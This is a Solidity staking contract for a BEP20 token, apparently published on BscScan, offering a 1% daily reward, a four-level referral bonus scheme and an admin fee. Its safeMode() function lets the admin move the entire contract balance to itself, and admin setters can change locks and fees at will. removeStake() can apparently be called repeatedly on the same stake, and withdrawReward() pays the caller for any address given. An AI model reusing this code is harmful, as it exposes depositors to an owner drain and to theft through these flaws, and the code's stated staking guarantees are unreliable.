/**
 *Submitted for verification at BscScan.com on 2022-05-17
*/

pragma solidity ^0.5.10; 

//*******************************************************************//
//------------------------ SafeMath Library -------------------------//
//*******************************************************************//

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, 'SafeMath mul failed');
    return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, 'SafeMath sub failed');
    return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, 'SafeMath add failed');
    return c;
    }
}


    
//****************************************************************************//
//---------------------        MAIN CODE STARTS HERE     ---------------------//
//****************************************************************************//
    

interface IBEP20Token
{
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint tokens) external returns (bool success);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function balanceOf(address user) external view returns(uint256);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);
    function totalSupply() external view returns (uint256);
}

contract Mintinghd {
    
    IBEP20Token public rewardToken;
    /*===============================
    =         DATA STORAGE          =
    ===============================*/

    // Public variables of the token
    using SafeMath for uint256;


    struct Stake {
        uint256 amount;
        uint256 startTime;
        uint256 lastCheckOutTime;  
        uint256 endTime;
        uint dailyreward;
    }

    struct User {
		Stake[] stake;
		address referrer;
        uint256 referrerBonus;
        uint256 Total_Token_buy;
        uint256 Total_buy;
        uint256 totalReferrer;
        uint256[4] refStageIncome; //total business of referrer each stage
        uint256[4] refStageBonus; //bonus of referrer each stage
		uint[4] refs;  // number of referrer each stage
	}

    
      mapping (address => User) public users;
      uint256 constant private _decimals = 9;
      uint[4] public ref_bonuses = [4,6,8,10];
      uint[4] public requiredDirectbusiness = [5000,25000,100000,500000];
      uint[4] public requiredownbuy = [500,2500,10000,50000];


     
      uint256 internal stakingRequirement = 1000000000;
      uint256 public _currentPurchseLimit;
      uint256 public _maxdistribution;

      uint256 public lockingperiod = 90 days;


      address[] internal stakeholders;
      
      uint256 constant public TIME_STEP =  1 days;
      address payable admin;

      uint256 public adminFee = 5;

      uint256 public actualrecive = 85;

      uint256 public contractPlaced;

      bool public isMaxPayout;
       
       
       /*===============================
        =         PUBLIC EVENTS         =
        ===============================*/

     // This generates a public event of token transfer
     event BuyToken(address indexed user, uint256 AmountofToken);
     event SellToken(address indexed user, uint256 Amountofvalue);
     event StakeToken(address indexed user, uint256 Token);
     event Withdrawn(address indexed user, uint256 Amount);
     event UnStake(address indexed user, uint256 Token);
     



   constructor(IBEP20Token _rewardToken, address payable _admin) public{
        rewardToken = _rewardToken;
        _currentPurchseLimit = 0;
        admin=_admin;
        contractPlaced = block.timestamp;
   }


    function percent(uint numerator, uint denominator, uint precision) internal pure returns(uint quotient) {

            // caution, check safe-to-multiply here
            uint _numerator  = numerator * 10 ** (precision+1);
            // with rounding of last digit
            uint _quotient =  ((_numerator / denominator) + 5) / 10;
            return ( _quotient);
    }

   /**
    * @notice A method to check if an address is a stakeholder.
    * @param _address The address to verify.
    * @return bool, uint256 Whether the address is a stakeholder,
    * and if so its position in the stakeholders array.
    */
   function isStakeholder(address _address) public view returns(bool, uint256)
   {
       for (uint256 s = 0; s < stakeholders.length; s += 1){
           if (_address == stakeholders[s]) return (true, s);
       }
       return (false, 0);
   }

   /**
    * @notice A method to add a stakeholder.
    * @param _stakeholder The stakeholder to add.
    */
   function addStakeholder(address _stakeholder) internal{
       (bool _isStakeholder,) = isStakeholder(_stakeholder);
       if(!_isStakeholder) stakeholders.push(_stakeholder);
   }


   function chkAllowance(address _holder, address _spender) public view returns(uint256){
       uint256 allowance = rewardToken.allowance(_holder, _spender);
       return allowance;
   }  

   /**
    * @notice A method for a stakeholder to create a stake.
    * @param _stake The size of the stake to be created.
    */
   function createStake(uint256 _stake, address _referrer) external{

       uint _balanceOf = rewardToken.balanceOf(msg.sender);

       _stake = _stake.mul(actualrecive).div(100);

       require( _balanceOf >= _stake, 'Insufficent Token!');
       require( _stake >= stakingRequirement, 'Min stake 1!');

        User storage user = users[msg.sender];

        if (user.referrer == address(0) && _referrer != msg.sender){
             user.referrer = _referrer;
         }

         require(user.referrer != address(0) || msg.sender == admin, "No upline");
        
         if (user.referrer != address(0)) {
		   
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(_stake);
                    users[upline].refs[i] = users[upline].refs[i].add(1);
					users[upline].totalReferrer++;
                    upline = users[upline].referrer;
                } else break;
            }
            
        }

         // referral distribution
        _refPayout(msg.sender,_stake);

       rewardToken.transferFrom(msg.sender,address(this),_stake);
       if(users[msg.sender].stake.length == 0) addStakeholder(msg.sender);
       users[msg.sender].stake.push(Stake(_stake, block.timestamp, 0, 0, 10));
       emit StakeToken(msg.sender,_stake);
   }

   
   function removeStake(uint _index) external
   {
       uint256 _balanceOfstakes = users[msg.sender].stake[_index].amount.add(getUserDividend(msg.sender,_index));
       require( _balanceOfstakes > 0 , 'Insufficent Token!');
       
       if(block.timestamp > users[msg.sender].stake[_index].startTime +lockingperiod){
        users[msg.sender].stake[_index].endTime = block.timestamp;
        rewardToken.transfer(msg.sender,_balanceOfstakes);
        //_mintTokens(msg.sender, _balanceOfstakes.sub(users[msg.sender].stake[_index].amount));
        emit UnStake(msg.sender,_balanceOfstakes);
       }
       
   }

   function userStake_start(address _address, uint _index)public view returns(uint256 _time){
       return users[_address].stake[_index].startTime;
   }


   function _refPayout(address _addr, uint256 _amount) internal {

		address up = users[_addr].referrer;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if((users[up].refStageIncome[0] >= requiredDirectbusiness[i].mul(1e9)) || (users[up].Total_Token_buy >= requiredownbuy[i].mul(1e9))){ 

    		        uint256 bonus = _amount * ref_bonuses[i] / 100;
                    users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                    users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
                    
            }
            up = users[up].referrer;
        }
    }

  


   function getUserTotalDividends(address userAddress) public view returns (uint256) {

       User storage user = users[userAddress];
       uint256 totalDividends;
	   uint256 dividends;
       uint256 totalStakes = totalStakes();
       

		for (uint256 i = 0; i < user.stake.length; i++) {

            if (user.stake[i].endTime == 0) {

                uint256 maxPayout = user.stake[i].amount.add(user.stake[i].amount.mul(200).div(100));
                if(user.stake[i].startTime > user.stake[i].lastCheckOutTime){
                dividends = (user.stake[i].amount.mul(user.stake[i].dailyreward).div(1000)).mul(block.timestamp.sub(user.stake[i].startTime)).div(TIME_STEP);
                }else{
                dividends = (user.stake[i].amount.mul(user.stake[i].dailyreward).div(1000)).mul(block.timestamp.sub(user.stake[i].lastCheckOutTime)).div(TIME_STEP);   
                }
                if (isMaxPayout && user.stake[i].amount.add(dividends) > maxPayout) {
                    dividends = user.stake[i].amount;
                }
            }
            totalDividends = totalDividends.add(dividends);
        }

        if(totalStakes.add(totalDividends) > _maxdistribution){
            uint256 maxSuply = _maxdistribution;
            totalDividends = maxSuply.sub(totalStakes);
        }


        return totalDividends;
   }

    function getUserDividend(address userAddress, uint _index) public view returns (uint256) {

       User storage user = users[userAddress];
       uint256 totalStakes = totalStakes();
	   uint256 dividends;

            if (user.stake[_index].endTime == 0) {
                uint256 maxPayout = user.stake[_index].amount.add(user.stake[_index].amount.mul(200).div(100));
                if(user.stake[_index].startTime > user.stake[_index].lastCheckOutTime){
                 dividends = (user.stake[_index].amount.mul(user.stake[_index].dailyreward).div(1000)).mul(block.timestamp.sub(user.stake[_index].startTime)).div(TIME_STEP);
                }else{
                 dividends = (user.stake[_index].amount.mul(user.stake[_index].dailyreward).div(1000)).mul(block.timestamp.sub(user.stake[_index].lastCheckOutTime)).div(TIME_STEP);   
                }
                if (isMaxPayout && user.stake[_index].amount.add(dividends) > maxPayout) {
                    dividends = user.stake[_index].amount;
                }
            }
           
        if(totalStakes.add(dividends) > _maxdistribution){
            uint256 maxSuply = _maxdistribution;
            dividends = maxSuply.sub(totalStakes);
        }

        return dividends;
   }


   function getUserTotalStake(address userAddress) public view returns (uint256) {

        User storage user = users[userAddress];
        uint256 TotalStake;
        for (uint256 i = 0; i < user.stake.length; i++) {
            if (user.stake[i].endTime == 0) {
                TotalStake = TotalStake.add(user.stake[i].amount);
            }
        }

        return TotalStake;
   }

   function withdrawReward(address userAddress) external {
      
       User storage user = users[userAddress];
       (uint256 totalDividends) = getUserTotalDividends(userAddress);
       uint256 totalReward = totalDividends.add(user.referrerBonus);
       users[userAddress].referrerBonus = 0;

       for (uint256 i = 0; i < user.stake.length; i++) {
            if (user.stake[i].endTime == 0) {
                user.stake[i].lastCheckOutTime = block.timestamp;
            }
        }

        uint256 fee = totalReward.mul(adminFee).div(100);
        uint256 actualReward = totalReward.sub(fee);
        rewardToken.transfer(admin,fee);
        rewardToken.transfer(msg.sender,actualReward);


   }

    function getUserDetails(address _user) external view returns(uint _stakeLength, uint256 _TotalBuy, uint256 _Total_token_buy, address _referrer){
            User storage user = users[_user];
            return (user.stake.length, user.Total_buy, user.Total_Token_buy, user.referrer);
    }



    function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
    }

   function userBalanceOf(address _addr) external view returns(uint _amount){
       _amount = rewardToken.balanceOf(_addr);  
   }

   function _safeTransfer(address _to, uint256 _amount) internal {
        rewardToken.transfer(_to,_amount);
   }

    /**
     * @notice A method to retrieve the stake for a stakeholder.
     * @param _stakeholder The stakeholder to retrieve the stake for.
     * @return uint256 The amount of wei staked.
    */
   function stakeOf(address _stakeholder, uint _index) external view returns(uint256){
       return users[_stakeholder].stake[_index].amount;
   }

   /**
    * @notice A method to the aggregated stakes from all stakeholders.
    * @return uint256 The aggregated stakes from all stakeholders.
    */
   function totalStakes() public view returns(uint256){
       uint256 _totalStakes = 0;
       for (uint256 s = 0; s < stakeholders.length; s += 1){
           _totalStakes = _totalStakes.add(getUserTotalStake(stakeholders[s]));
       }
       return _totalStakes;
   }

   function totalTokenSupply() public view returns(uint256){
       return rewardToken.totalSupply();
   }
   
   
   function stakeholdersLength() public view returns(uint256){
       return stakeholders.length;
   }


   function update_lockingperiod(uint256 _time) external{
       require(msg.sender == admin);
       lockingperiod = _time;
   }

   function updateStakingRequirement(uint256 _amount) external{
       require(msg.sender == admin);
       stakingRequirement = _amount;
   }

   function updateAdminFee(uint256 _percent) external{
       require(msg.sender == admin);
       adminFee = _percent;
   }

   function updateisMaxPayout(bool _bool) external{
       require(msg.sender == admin);
       isMaxPayout = _bool;
   }

   function update_maxdistribution(uint256 _token) external{
       require(msg.sender == admin);
       _maxdistribution = _token;
   }

   function update_actualrecive(uint256 _per) external{
       require(msg.sender == admin);
       actualrecive = _per;
   }

   

   

   function safeMode() external{
       require(msg.sender == admin);
       uint256 _balanceOf = rewardToken.balanceOf(address(this));
       _safeTransfer(admin,_balanceOf);
   }

   

   function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

   

}